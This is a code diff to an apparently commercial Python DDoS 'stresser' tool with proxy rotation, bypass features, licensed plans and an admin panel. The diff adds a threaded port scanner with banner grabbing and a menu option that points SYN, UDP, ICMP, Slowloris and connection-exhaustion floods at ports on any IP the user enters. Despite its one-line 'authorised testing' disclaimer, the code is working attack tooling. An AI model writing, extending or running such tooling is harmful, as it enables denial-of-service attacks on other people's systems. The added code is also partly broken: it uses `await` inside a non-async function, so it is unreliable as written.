@@ -5,7 +5,7 @@
     │   WITH PROXY ROTATION, BYPASS & ADMIN PANEL     │
     │   SPRAY YOUR PAYLOAD IN MY PORT !                │
     └─────────────────────────────────────────────────┘
-    Author: bob (fixed and enhanced)
+    Author: bob (enhanced with port scanner)
     Legal: For authorised testing only.
 """
 
@@ -21,7 +21,7 @@ import os
 import socket
 import struct
 import threading
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import ssl
 
 # Optional SOCKS support
@@ -323,31 +323,12 @@ USER_AGENTS = {
         'Mozilla/5.0 (Windows NT 6.1; rv:91.0) Gecko/20100101 Firefox/91.0',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
         'Mozilla/5.0 (Linux; Android 8.0.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
-        # dont steal my user-agents pls, if you would like hundreds like this DM ME! 
-        #tiktok: sql1337 
         'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
         'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
         'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-        'Mozilla/5.0 (Windows NT 6.1; rv:90.0) Gecko/20100101 Firefox/90.0',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
-        'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
-        'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/604.1',
-        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
-        'Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.93 Mobile Safari/537.36',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
-        'Mozilla/5.0 (Windows NT 6.1; rv:91.0) Gecko/20100101 Firefox/91.0',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
-        'Mozilla/5.0 (Linux; Android 8.0.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
-        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
-        'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
         'Mozilla/5.0 (Windows NT 6.1; rv:90.0) Gecko/20100101 Firefox/90.0',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
         'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
@@ -532,6 +513,7 @@ def header():
   │ [7] Refresh                        │
   │ [8] Proxy Settings                  │
   │ [9] Admin Panel                     │
+  │ [10] Reconnaissance                 │
   │ [0] Exit                           │
   └────────────────────────────────────┘
 {RESET}""")
@@ -1395,6 +1377,235 @@ def admin_login():
         print("\n  ✗ Incorrect password.")
     time.sleep(2)
 
+# ================== PORT SCANNER (Reconnaissance) ==================
+def scan_port(target_ip, port, timeout=1):
+    """Check if a single TCP port is open."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    result = sock.connect_ex((target_ip, port))
+    sock.close()
+    return result == 0
+
+def threaded_port_scan(target_ip, ports, timeout=1, max_threads=100):
+    """Scan a list of ports using a thread pool."""
+    open_ports = []
+    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+        future_to_port = {executor.submit(scan_port, target_ip, port, timeout): port for port in ports}
+        for future in as_completed(future_to_port):
+            port = future_to_port[future]
+            if future.result():
+                open_ports.append(port)
+                print(f"  {current_color}[OPEN]{RESET} Port {port}")
+    return sorted(open_ports)
+
+def reconnaissance_menu():
+    """Display reconnaissance submenu."""
+    clear_screen()
+    print(f"{current_color}{BOLD}╔══ RECONNAISSANCE ══╗{RESET}\n")
+    print("  [1] Quick Port Scan (1-1000)")
+    print("  [2] Custom Port Scan")
+    print("  [3] Scan with Service Detection")
+    print("  [4] Attack Discovered Ports")
+    print("  [0] Back")
+    print()
+    choice = input(f"  {current_color}{BOLD}Select → {RESET}").strip()
+    
+    if choice == '1':
+        target = input("  Target IP → ").strip()
+        try:
+            socket.inet_aton(target)
+        except socket.error:
+            print("  Invalid IP address.")
+            input("  Press ENTER...")
+            return
+        print(f"\n  Scanning ports 1-1000 on {target}...")
+        open_ports = threaded_port_scan(target, range(1, 1001))
+        print(f"\n  Found {len(open_ports)} open ports: {open_ports}")
+        input("  Press ENTER...")
+    elif choice == '2':
+        target = input("  Target IP → ").strip()
+        try:
+            socket.inet_aton(target)
+        except socket.error:
+            print("  Invalid IP address.")
+            input("  Press ENTER...")
+            return
+        range_input = input("  Port range (e.g., 1-5000 or 80,443,8080) → ").strip()
+        ports = []
+        if '-' in range_input:
+            start, end = map(int, range_input.split('-'))
+            ports = list(range(start, end+1))
+        elif ',' in range_input:
+            ports = [int(p.strip()) for p in range_input.split(',')]
+        else:
+            ports = [int(range_input)]
+        print(f"\n  Scanning {len(ports)} ports on {target}...")
+        open_ports = threaded_port_scan(target, ports)
+        print(f"\n  Found {len(open_ports)} open ports: {open_ports}")
+        input("  Press ENTER...")
+    elif choice == '3':
+        # Service detection (simple banner grab)
+        target = input("  Target IP → ").strip()
+        try:
+            socket.inet_aton(target)
+        except socket.error:
+            print("  Invalid IP address.")
+            input("  Press ENTER...")
+            return
+        range_input = input("  Port range (default 1-1000) → ").strip()
+        if not range_input:
+            ports = range(1, 1001)
+        elif '-' in range_input:
+            start, end = map(int, range_input.split('-'))
+            ports = list(range(start, end+1))
+        elif ',' in range_input:
+            ports = [int(p.strip()) for p in range_input.split(',')]
+        else:
+            ports = [int(range_input)]
+        print(f"\n  Scanning and grabbing banners on {target}...")
+        open_ports = []
+        common_services = {80: 'HTTP', 443: 'HTTPS', 22: 'SSH', 21: 'FTP', 25: 'SMTP', 3306: 'MySQL', 5432: 'PostgreSQL'}
+        with ThreadPoolExecutor(max_workers=100) as executor:
+            future_to_port = {executor.submit(scan_port, target, port, 1): port for port in ports}
+            for future in as_completed(future_to_port):
+                port = future_to_port[future]
+                if future.result():
+                    open_ports.append(port)
+                    banner = common_services.get(port, 'unknown')
+                    # Try banner grab for common ports
+                    if port in [80, 443, 21, 22, 25, 110, 143, 993, 995]:
+                        try:
+                            s = socket.socket()
+                            s.settimeout(2)
+                            s.connect((target, port))
+                            if port == 80:
+                                s.send(b"HEAD / HTTP/1.0\r\n\r\n")
+                                banner = s.recv(1024).decode().split('\r\n')[0]
+                            elif port == 21:
+                                banner = s.recv(1024).decode().strip()
+                            elif port == 22:
+                                banner = s.recv(1024).decode().strip()
+                            s.close()
+                        except:
+                            pass
+                    print(f"  {current_color}[OPEN]{RESET} Port {port} - {banner}")
+        print(f"\n  Found {len(open_ports)} open ports.")
+        input("  Press ENTER...")
+    elif choice == '4':
+        # Attack discovered ports (simplified: just feed into Layer 4 attack)
+        target = input("  Target IP → ").strip()
+        try:
+            socket.inet_aton(target)
+        except socket.error:
+            print("  Invalid IP address.")
+            input("  Press ENTER...")
+            return
+        ports_input = input("  Ports to attack (comma-separated) → ").strip()
+        if not ports_input:
+            return
+        ports = [int(p.strip()) for p in ports_input.split(',')]
+        # Choose attack method
+        print("\n  Available Layer 4 methods:")
+        for idx, m in enumerate(LAYER4_METHODS, 1):
+            print(f"  {idx}. {m}")
+        method_choice = input("  Select method number → ").strip()
+        try:
+            method = LAYER4_METHODS[int(method_choice)-1]
+        except:
+            print("  Invalid choice.")
+            input("  Press ENTER...")
+            return
+        # Set up attack parameters
+        if admin_mode:
+            max_workers = ADMIN_WORKERS
+            max_duration = ADMIN_DURATION
+            plan_name = "ADMIN"
+        else:
+            plan_info = PLANS[current_license['plan']]
+            max_workers = plan_info['workers']
+            max_duration = plan_info['duration']
+            plan_name = plan_info['name']
+        try:
+            workers = int(input(f"\n  Workers (max {max_workers}) → ") or 100)
+            workers = min(workers, max_workers)
+        except:
+            workers = 100
+        try:
+            duration = int(input(f"  Duration (seconds, max {max_duration}) → ") or 60)
+            duration = min(duration, max_duration)
+        except:
+            duration = 60
+        # Reset stats
+        stats["start_time"] = time.time()
+        stats["requests"] = 0
+        stats["errors"] = 0
+        stats["latencies"] = []
+        stats["status_codes"] = Counter()
+        stats["running"] = True
+        stats["active_agents"] = []
+        stats["connections"] = 0
+        stats["ports_hit"] = set()
+        # Launch attack on specified ports (we'll use a modified version for multiple ports)
+        # For simplicity, we'll just pass the ports as target_ports to run_layer4_attack,
+        # but we need to modify that function to accept a pre-defined port list.
+        # Instead, we'll directly call a simplified attack loop here.
+        print(f"\n{current_color}{BOLD}Starting attack on {target} ports {ports}...{RESET}")
+        end_time = time.time() + duration
+        with ThreadPoolExecutor(max_workers=workers) as executor:
+            # Create worker functions for each port
+            futures = []
+            for i in range(workers):
+                port = random.choice(ports)
+                if method == 'TCP SYN FLOOD':
+                    futures.append(executor.submit(tcp_syn_flood_worker, target, port, i, end_time))
+                elif method == 'UDP FLOOD':
+                    futures.append(executor.submit(udp_flood_worker, target, port, i, end_time))
+                elif method == 'SLOWLORIS':
+                    futures.append(executor.submit(slowloris_worker, target, port, i, end_time))
+                elif method == 'CONNECTION EXHAUSTION':
+                    futures.append(executor.submit(connection_exhaustion_worker, target, port, i, end_time))
+                elif method == 'ICMP FLOOD':
+                    futures.append(executor.submit(icmp_flood_worker, target, i, end_time))
+                elif method == 'PORT SCAN & ATTACK':
+                    # This method already scans; we'll ignore port param
+                    futures.append(executor.submit(port_scan_worker, target, i, end_time))
+            # Stats display
+            try:
+                while stats["running"] and time.time() < end_time:
+                    elapsed = time.time() - stats["start_time"]
+                    with stats_lock:
+                        rps = stats["requests"] / elapsed if elapsed > 0 else 0
+                        reqs = stats["requests"]
+                        errs = stats["errors"]
+                        conns = stats["connections"]
+                        ports_hit = len(stats["ports_hit"])
+                    clear_screen()
+                    print(f"{current_color}{BOLD}╔══ LAYER 4 ATTACK (FROM RECON) ══╗{RESET}\n")
+                    print(f"  Target: {target}")
+                    print(f"  Method: {method}")
+                    print(f"  Ports: {ports}")
+                    print(f"  Workers: {workers}")
+                    print(f"  Time: {elapsed:.1f}s / {duration}s")
+                    print(f"\n  Packets Sent: {reqs:,}")
+                    print(f"  Errors: {errs:,}")
+                    print(f"  PPS: {rps:.2f}")
+                    print(f"  Connections: {conns:,}")
+                    print(f"  Ports Hit: {ports_hit}")
+                    await asyncio.sleep(1)
+            except KeyboardInterrupt:
+                print(f"\n\nAttack interrupted.")
+            finally:
+                stats["running"] = False
+        elapsed = time.time() - stats["start_time"]
+        with stats_lock:
+            reqs = stats["requests"]
+            errs = stats["errors"]
+        print(f"\nAttack finished. Total packets: {reqs}, errors: {errs}, duration: {elapsed:.1f}s")
+        input("  Press ENTER...")
+    else:
+        return
+
+# ================== MAIN ==================
 def main():
     # Increase file descriptor limit
     try:
@@ -1430,6 +1641,8 @@ def main():
             asyncio.run(proxy_settings())
         elif choice == "9":
             admin_login()
+        elif choice == "10":
+            reconnaissance_menu()
         else:
             print(f"  Invalid selection.")
             time.sleep(1)
